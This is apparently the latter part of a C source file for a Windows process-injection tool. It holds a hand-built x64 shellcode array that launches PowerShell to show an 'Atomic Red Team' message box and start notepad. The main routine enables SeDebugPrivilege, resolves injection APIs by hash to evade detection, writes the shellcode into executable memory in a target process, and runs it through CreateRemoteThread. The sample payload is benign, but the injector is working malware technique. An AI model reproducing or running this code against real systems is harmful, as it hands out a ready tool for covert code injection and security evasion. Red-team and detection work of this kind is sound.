0x8d,0x98,0x03,0x00,0x00,0xff,0x95,0x90,0x03,0x00,
0x00,0x48,0xb8,0x5c,0x00,0x3f,0x00,0x3f,0x00,0x5c,
0x00,0x48,0x89,0x85,0xe0,0x00,0x00,0x00,0x48,0xb8,
0x43,0x00,0x3a,0x00,0x5c,0x00,0x57,0x00,0x48,0x89,
0x85,0xe8,0x00,0x00,0x00,0x48,0xb8,0x69,0x00,0x6e,
0x00,0x64,0x00,0x6f,0x00,0x48,0x89,0x85,0xf0,0x00,
0x00,0x00,0x48,0xb8,0x77,0x00,0x73,0x00,0x5c,0x00,
0x53,0x00,0x48,0x89,0x85,0xf8,0x00,0x00,0x00,0x48,
0xb8,0x79,0x00,0x73,0x00,0x74,0x00,0x65,0x00,0x48,
0x89,0x85,0x00,0x01,0x00,0x00,0x48,0xb8,0x6d,0x00,
0x33,0x00,0x32,0x00,0x5c,0x00,0x48,0x89,0x85,0x08,
0x01,0x00,0x00,0x48,0xb8,0x57,0x00,0x69,0x00,0x6e,
0x00,0x64,0x00,0x48,0x89,0x85,0x10,0x01,0x00,0x00,
0x48,0xb8,0x6f,0x00,0x77,0x00,0x73,0x00,0x50,0x00,
0x48,0x89,0x85,0x18,0x01,0x00,0x00,0x48,0xb8,0x6f,
0x00,0x77,0x00,0x65,0x00,0x72,0x00,0x48,0x89,0x85,
0x20,0x01,0x00,0x00,0x48,0xb8,0x53,0x00,0x68,0x00,
0x65,0x00,0x6c,0x00,0x48,0x89,0x85,0x28,0x01,0x00,
0x00,0x48,0xb8,0x6c,0x00,0x5c,0x00,0x76,0x00,0x31,
0x00,0x48,0x89,0x85,0x30,0x01,0x00,0x00,0x48,0xb8,
0x2e,0x00,0x30,0x00,0x5c,0x00,0x70,0x00,0x48,0x89,
0x85,0x38,0x01,0x00,0x00,0x48,0xb8,0x6f,0x00,0x77,
0x00,0x65,0x00,0x72,0x00,0x48,0x89,0x85,0x40,0x01,
0x00,0x00,0x48,0xb8,0x73,0x00,0x68,0x00,0x65,0x00,
0x6c,0x00,0x48,0x89,0x85,0x48,0x01,0x00,0x00,0x48,
0xb8,0x6c,0x00,0x2e,0x00,0x65,0x00,0x78,0x00,0x48,
0x89,0x85,0x50,0x01,0x00,0x00,0x48,0xb8,0x65,0x00,
0x20,0x00,0x2d,0x00,0x43,0x00,0x48,0x89,0x85,0x58,
0x01,0x00,0x00,0x48,0xb8,0x6f,0x00,0x6d,0x00,0x6d,
0x00,0x61,0x00,0x48,0x89,0x85,0x60,0x01,0x00,0x00,
0x48,0xb8,0x6e,0x00,0x64,0x00,0x20,0x00,0x22,0x00,
0x48,0x89,0x85,0x68,0x01,0x00,0x00,0x48,0xb8,0x41,
0x00,0x64,0x00,0x64,0x00,0x2d,0x00,0x48,0x89,0x85,
0x70,0x01,0x00,0x00,0x48,0xb8,0x54,0x00,0x79,0x00,
0x70,0x00,0x65,0x00,0x48,0x89,0x85,0x78,0x01,0x00,
0x00,0x48,0xb8,0x20,0x00,0x2d,0x00,0x41,0x00,0x73,
0x00,0x48,0x89,0x85,0x80,0x01,0x00,0x00,0x48,0xb8,
0x73,0x00,0x65,0x00,0x6d,0x00,0x62,0x00,0x48,0x89,
0x85,0x88,0x01,0x00,0x00,0x48,0xb8,0x6c,0x00,0x79,
0x00,0x4e,0x00,0x61,0x00,0x48,0x89,0x85,0x90,0x01,
0x00,0x00,0x48,0xb8,0x6d,0x00,0x65,0x00,0x20,0x00,
0x50,0x00,0x48,0x89,0x85,0x98,0x01,0x00,0x00,0x48,
0xb8,0x72,0x00,0x65,0x00,0x73,0x00,0x65,0x00,0x48,
0x89,0x85,0xa0,0x01,0x00,0x00,0x48,0xb8,0x6e,0x00,
0x74,0x00,0x61,0x00,0x74,0x00,0x48,0x89,0x85,0xa8,
0x01,0x00,0x00,0x48,0xb8,0x69,0x00,0x6f,0x00,0x6e,
0x00,0x46,0x00,0x48,0x89,0x85,0xb0,0x01,0x00,0x00,
0x48,0xb8,0x72,0x00,0x61,0x00,0x6d,0x00,0x65,0x00,
0x48,0x89,0x85,0xb8,0x01,0x00,0x00,0x48,0xb8,0x77,
0x00,0x6f,0x00,0x72,0x00,0x6b,0x00,0x48,0x89,0x85,
0xc0,0x01,0x00,0x00,0x48,0xb8,0x3b,0x00,0x20,0x00,
0x5b,0x00,0x53,0x00,0x48,0x89,0x85,0xc8,0x01,0x00,
0x00,0x48,0xb8,0x79,0x00,0x73,0x00,0x74,0x00,0x65,
0x00,0x48,0x89,0x85,0xd0,0x01,0x00,0x00,0x48,0xb8,
0x6d,0x00,0x2e,0x00,0x57,0x00,0x69,0x00,0x48,0x89,
0x85,0xd8,0x01,0x00,0x00,0x48,0xb8,0x6e,0x00,0x64,
0x00,0x6f,0x00,0x77,0x00,0x48,0x89,0x85,0xe0,0x01,
0x00,0x00,0x48,0xb8,0x73,0x00,0x2e,0x00,0x4d,0x00,
0x65,0x00,0x48,0x89,0x85,0xe8,0x01,0x00,0x00,0x48,
0xb8,0x73,0x00,0x73,0x00,0x61,0x00,0x67,0x00,0x48,
0x89,0x85,0xf0,0x01,0x00,0x00,0x48,0xb8,0x65,0x00,
0x42,0x00,0x6f,0x00,0x78,0x00,0x48,0x89,0x85,0xf8,
0x01,0x00,0x00,0x48,0xb8,0x5d,0x00,0x3a,0x00,0x3a,
0x00,0x53,0x00,0x48,0x89,0x85,0x00,0x02,0x00,0x00,
0x48,0xb8,0x68,0x00,0x6f,0x00,0x77,0x00,0x28,0x00,
0x48,0x89,0x85,0x08,0x02,0x00,0x00,0x48,0xb8,0x27,
0x00,0x41,0x00,0x74,0x00,0x6f,0x00,0x48,0x89,0x85,
0x10,0x02,0x00,0x00,0x48,0xb8,0x6d,0x00,0x69,0x00,
0x63,0x00,0x20,0x00,0x48,0x89,0x85,0x18,0x02,0x00,
0x00,0x48,0xb8,0x52,0x00,0x65,0x00,0x64,0x00,0x20,
0x00,0x48,0x89,0x85,0x20,0x02,0x00,0x00,0x48,0xb8,
0x54,0x00,0x65,0x00,0x61,0x00,0x6d,0x00,0x48,0x89,
0x85,0x28,0x02,0x00,0x00,0x48,0xb8,0x27,0x00,0x2c,
0x00,0x20,0x00,0x27,0x00,0x48,0x89,0x85,0x30,0x02,
0x00,0x00,0x48,0xb8,0x57,0x00,0x61,0x00,0x72,0x00,
0x6e,0x00,0x48,0x89,0x85,0x38,0x02,0x00,0x00,0x48,
0xb8,0x69,0x00,0x6e,0x00,0x67,0x00,0x27,0x00,0x48,
0x89,0x85,0x40,0x02,0x00,0x00,0x48,0xb8,0x2c,0x00,
0x20,0x00,0x27,0x00,0x4f,0x00,0x48,0x89,0x85,0x48,
0x02,0x00,0x00,0x48,0xb8,0x4b,0x00,0x27,0x00,0x2c,
0x00,0x20,0x00,0x48,0x89,0x85,0x50,0x02,0x00,0x00,
0x48,0xb8,0x27,0x00,0x57,0x00,0x61,0x00,0x72,0x00,
0x48,0x89,0x85,0x58,0x02,0x00,0x00,0x48,0xb8,0x6e,
0x00,0x69,0x00,0x6e,0x00,0x67,0x00,0x48,0x89,0x85,
0x60,0x02,0x00,0x00,0x48,0xb8,0x27,0x00,0x29,0x00,
0x3b,0x00,0x20,0x00,0x48,0x89,0x85,0x68,0x02,0x00,
0x00,0x48,0xb8,0x53,0x00,0x74,0x00,0x61,0x00,0x72,
0x00,0x48,0x89,0x85,0x70,0x02,0x00,0x00,0x48,0xb8,
0x74,0x00,0x2d,0x00,0x50,0x00,0x72,0x00,0x48,0x89,
0x85,0x78,0x02,0x00,0x00,0x48,0xb8,0x6f,0x00,0x63,
0x00,0x65,0x00,0x73,0x00,0x48,0x89,0x85,0x80,0x02,
0x00,0x00,0x48,0xb8,0x73,0x00,0x20,0x00,0x27,0x00,
0x6e,0x00,0x48,0x89,0x85,0x88,0x02,0x00,0x00,0x48,
0xb8,0x6f,0x00,0x74,0x00,0x65,0x00,0x70,0x00,0x48,
0x89,0x85,0x90,0x02,0x00,0x00,0x48,0xb8,0x61,0x00,
0x64,0x00,0x2e,0x00,0x65,0x00,0x48,0x89,0x85,0x98,
0x02,0x00,0x00,0x48,0xb8,0x78,0x00,0x65,0x00,0x27,
0x00,0x22,0x00,0x48,0x89,0x85,0xa0,0x02,0x00,0x00,
0x48,0x8d,0x95,0xe0,0x00,0x00,0x00,0x48,0x8d,0x8d,
0xa8,0x03,0x00,0x00,0xff,0x95,0x90,0x03,0x00,0x00,
0x48,0xc7,0x85,0xb8,0x03,0x00,0x00,0x00,0x00,0x00,
0x00,0xc7,0x44,0x24,0x50,0x01,0x00,0x00,0x00,0x48,
0xc7,0x44,0x24,0x48,0x00,0x00,0x00,0x00,0x48,0xc7,
0x44,0x24,0x40,0x00,0x00,0x00,0x00,0x48,0xc7,0x44,
0x24,0x38,0x00,0x00,0x00,0x00,0x48,0xc7,0x44,0x24,
0x30,0x00,0x00,0x00,0x00,0x48,0xc7,0x44,0x24,0x28,
0x00,0x00,0x00,0x00,0x48,0x8d,0x85,0xa8,0x03,0x00,
0x00,0x48,0x89,0x44,0x24,0x20,0x45,0x33,0xc9,0x45,
0x33,0xc0,0x48,0x8d,0x95,0x98,0x03,0x00,0x00,0x48,
0x8d,0x8d,0xb8,0x03,0x00,0x00,0xff,0x95,0x80,0x03,
0x00,0x00,0x48,0x8d,0x85,0xc0,0x03,0x00,0x00,0x48,
0x8b,0xf8,0x33,0xc0,0xb9,0x58,0x00,0x00,0x00,0xf3,
0xaa,0x48,0xc7,0x85,0xc0,0x03,0x00,0x00,0x58,0x00,
0x00,0x00,0xc7,0x85,0xc8,0x03,0x00,0x00,0x00,0x00,
0x00,0x00,0xb8,0x08,0x00,0x00,0x00,0x48,0x6b,0xc0,
0x01,0x41,0xb8,0x20,0x00,0x00,0x00,0xba,0x08,0x00,
0x00,0x00,0x48,0x8b,0x4d,0x00,0x48,0x8b,0x4c,0x01,
0x28,0xff,0x95,0x78,0x03,0x00,0x00,0x48,0x89,0x85,
0x20,0x04,0x00,0x00,0x48,0x8b,0x85,0x20,0x04,0x00,
0x00,0x48,0xc7,0x00,0x28,0x00,0x00,0x00,0xb8,0x20,
0x00,0x00,0x00,0x48,0x6b,0xc0,0x00,0x48,0x8b,0x8d,
0x20,0x04,0x00,0x00,0xc7,0x44,0x01,0x08,0x05,0x00,
0x02,0x00,0xb8,0x20,0x00,0x00,0x00,0x48,0x6b,0xc0,
0x00,0x0f,0xb7,0x8d,0x98,0x03,0x00,0x00,0x48,0x8b,
0x95,0x20,0x04,0x00,0x00,0x48,0x89,0x4c,0x02,0x10,
0xb8,0x20,0x00,0x00,0x00,0x48,0x6b,0xc0,0x00,0x48,
0x8b,0x8d,0x20,0x04,0x00,0x00,0x48,0x8b,0x95,0xa0,
0x03,0x00,0x00,0x48,0x89,0x54,0x01,0x18,0x48,0xc7,
0x85,0x30,0x04,0x00,0x00,0x00,0x00,0x00,0x00,0x48,
0x8b,0x85,0x20,0x04,0x00,0x00,0x48,0x89,0x44,0x24,
0x50,0x48,0x8d,0x85,0xc0,0x03,0x00,0x00,0x48,0x89,
0x44,0x24,0x48,0x48,0x8b,0x85,0xb8,0x03,0x00,0x00,
0x48,0x89,0x44,0x24,0x40,0xc7,0x44,0x24,0x38,0x00,
0x00,0x00,0x00,0xc7,0x44,0x24,0x30,0x00,0x00,0x00,
0x00,0x48,0xc7,0x44,0x24,0x28,0x00,0x00,0x00,0x00,
0x48,0xc7,0x44,0x24,0x20,0x00,0x00,0x00,0x00,0x41,
0xb9,0xff,0xff,0x1f,0x00,0x41,0xb8,0xff,0xff,0x1f,
0x00,0x48,0x8d,0x95,0x30,0x04,0x00,0x00,0x48,0x8d,
0x8d,0x28,0x04,0x00,0x00,0xff,0x95,0x88,0x03,0x00,
0x00,0x89,0x85,0x38,0x04,0x00,0x00,0x48,0xb8,0x4e,
0x74,0x53,0x75,0x73,0x70,0x65,0x6e,0x48,0x89,0x45,
0x10,0x48,0xb8,0x64,0x54,0x68,0x72,0x65,0x61,0x64,
0x00,0x48,0x89,0x45,0x18,0x48,0x8d,0x55,0x10,0x48,
0x8b,0x8d,0x68,0x03,0x00,0x00,0xff,0x95,0x50,0x03,
0x00,0x00,0x48,0x89,0x85,0x40,0x04,0x00,0x00,0x33,
0xd2,0x48,0xc7,0xc1,0xfe,0xff,0xff,0xff,0xff,0x95,
0x40,0x04,0x00,0x00,0x48,0x8d,0xa5,0x18,0x05,0x00,
0x00,0x5f,0x5d,0xc3
};



int main(int argc, char *argv[])
{

    HMODULE hKernel32 = LoadLibraryA("kernel32.dll");
    if (!hKernel32) {
        printf("[-]Failed to load kernel32.dll.\n");
        return -1;
    }

    PFN_GETLASTERROR pGetLastError = (PFN_GETLASTERROR)GetProcAddress(hKernel32, "GetLastError");


    if (!EnableWindowsPrivilege(L"SeDebugPrivilege")) {
    // if (!EnableWindowsPrivilege(TEXT("SeDebugPrivilege"))) {
        printf("[-]Failed to enable SeDebugPrivilege. You might not have sufficient permissions.\n");
        return -1;
    }

    // Target process information:
    STARTUPINFO si = { sizeof(STARTUPINFO) };
    PROCESS_INFORMATION pi;
    DWORD pid = 0;
    char notepadPath[256] = {0};  // Initialize the buffer

    if (argc != 2) {
        printf("Usage: %s <PID>\n", argv[0], "running with default notepad");
        // Use relevant notepad based on sys arch. 
        // char notepadPath[256] = {0};  // Initialize the buffer

        if (IsSystem64Bit()) {
            printf("[*] system is 64 bit\n");
            strcpy_s(notepadPath, sizeof(notepadPath), "C:\\Windows\\System32\\notepad.exe");
        } else {
            printf("[*] system is 32 bit\n");
            strcpy_s(notepadPath, sizeof(notepadPath), "C:\\Windows\\SysWOW64\\notepad.exe");
        }

        printf("[*] notepad path: %s\n", notepadPath);
        // Start Notepad
        // BOOL success = CreateProcess("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
        BOOL success = CreateProcess(notepadPath, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
        if (!success) {
            MessageBox(NULL, "[-]Failed to start Notepad.", "Error", MB_OK | MB_ICONERROR);
            DWORD error = GetLastError();
            // You can now print out the error or look it up
            printf("[-]Failed to launch Notepad. Error: %d\n", error);
            return 1;
        }
        // Assign PID
        pid = pi.dwProcessId;
        
    } else {
        printf("[*]PID provided: %s\n", argv[1]);
        // Convert command line argument to PID
        pid = atoi(argv[1]);
    }

    // Wait for 1 second
    Sleep(1000);
    printf("[*]target process PID: %d\n", pid);

// ///// test this hash collison

    DWORD hashOpenProcess = getHashFromString("OpenProcess");
    DWORD hashIsWow64Process = getHashFromString("IsWow64Process");
    DWORD hashWriteProcessMemory = getHashFromString("WriteProcessMemory");
    DWORD hashDiscardVirtualMemory = getHashFromString("DiscardVirtualMemory");
    DWORD hashCreateRemoteThread = getHashFromString("CreateRemoteThread");
    DWORD hashCreateKernelThread = getHashFromString("CreateKernelThread");

    printf("[*] Hash of OpenProcess: 0x%lx\n", hashOpenProcess);
    printf("[*]Hash of IsWow64Process: 0x%lx\n", hashIsWow64Process);
    printf("[*]Hash of WriteProcessMemory: 0x%lx\n", hashWriteProcessMemory);
    printf("[*]Hash of DiscardVirtualMemory: 0x%lx\n", hashDiscardVirtualMemory);
    printf("[*]Hash of hashCreateRemoteThread: 0x%lx\n", hashCreateRemoteThread);
    printf("[*]Hash of hashCreateKernelThread: 0x%lx\n", hashCreateKernelThread);

    if (hashOpenProcess == hashIsWow64Process) {
        printf("[*]Hash of OpenProcess equals hash of IsWow64Process.\n");
    } else {
        printf("[*]Hash of OpenProcess does NOT equal hash of IsWow64Process.\n");
    }

    if (hashWriteProcessMemory == hashDiscardVirtualMemory) {
        printf("[*]Hash of WriteProcessMemory equals hash of DiscardVirtualMemory.\n");
    } else {
        printf("[*]Hash of WriteProcessMemory does NOT equal hash of DiscardVirtualMemory.\n");
    }
    if (hashCreateRemoteThread == hashCreateKernelThread) {
        printf("[*]Hash of hashCreateRemoteThread equals hash of hashCreateKernelThread.\n");
    } else {
        printf("[*]Hash of hashCreateRemoteThread does NOT equal hash of hashCreateKernelThread.\n");
    }

///// test this hash collison



    // Calculate the function hashes
    // DWORD hashOpenProcess = getHashFromString("OpenProcess");
    DWORD hashVirtualAllocEx = getHashFromString("VirtualAllocEx");
    // DWORD hashWriteProcessMemory = getHashFromString("WriteProcessMemory");
    // DWORD hashCreateRemoteThread = getHashFromString("CreateRemoteThread");

    // Resolve function addresses by hash
    customOpenProcess OpenProcessB = (customOpenProcess)getFunctionAddressByHash((char *)"kernel32.dll", hashOpenProcess);
    customVirtualAllocEx VirtualAllocEx = (customVirtualAllocEx)getFunctionAddressByHash((char *)"kernel32.dll", hashVirtualAllocEx);
    customWriteProcessMemory WriteProcessMemory = (customWriteProcessMemory)getFunctionAddressByHash((char *)"kernel32.dll", hashWriteProcessMemory);
    customCreateRemoteThread CreateRemoteThread = (customCreateRemoteThread)getFunctionAddressByHash((char *)"kernel32.dll", hashCreateRemoteThread);

    HANDLE processHandle;
    PVOID remoteBuffer;
    
    // Open the target process with all access
    processHandle = OpenProcessB(PROCESS_ALL_ACCESS, FALSE, pid);
    if (processHandle == NULL)
    {
        DWORD dwError = pGetLastError();
        printf("[-]Failed to open the notepad process. Error: %d\n", dwError);
        return -1;
    } else {
        printf("[+]Successfully opened the notepad process.\n");
    }

    // Allocate memory in the target process
    remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof(magiccode), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
    if (remoteBuffer == NULL)
    {
        printf("[-]Error allocating memory.\n");
        CloseHandle(processHandle);
        return -1;
    } else {
        printf("[+]Successfully allocated memory in the target process.\n");
    }

    // Write the magiccode to the allocated memory
    if (!WriteProcessMemory(processHandle, remoteBuffer, magiccode, sizeof(magiccode), NULL))
    {
        printf("[-]Error writing to process memory.\n");
        VirtualFreeEx(processHandle, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(processHandle);
        return -1;
    } else {
        printf("[+]Successfully wrote magiccode to the allocated memory.\n");
    }

    // Create a remote thread that starts at the magiccode
    HANDLE remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
    if (remoteThread == NULL)
    {
        printf("[-]Error creating remote thread.\n");
        VirtualFreeEx(processHandle, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(processHandle);
        return -1;
    } else {
        printf("[+]Successfully created remote thread.\n");
    }

    // Wait for the remote thread to complete
    WaitForSingleObject(remoteThread, INFINITE);

    // Clean up
    CloseHandle(remoteThread);
    VirtualFreeEx(processHandle, remoteBuffer, 0, MEM_RELEASE);
    CloseHandle(processHandle);

    return 0;

}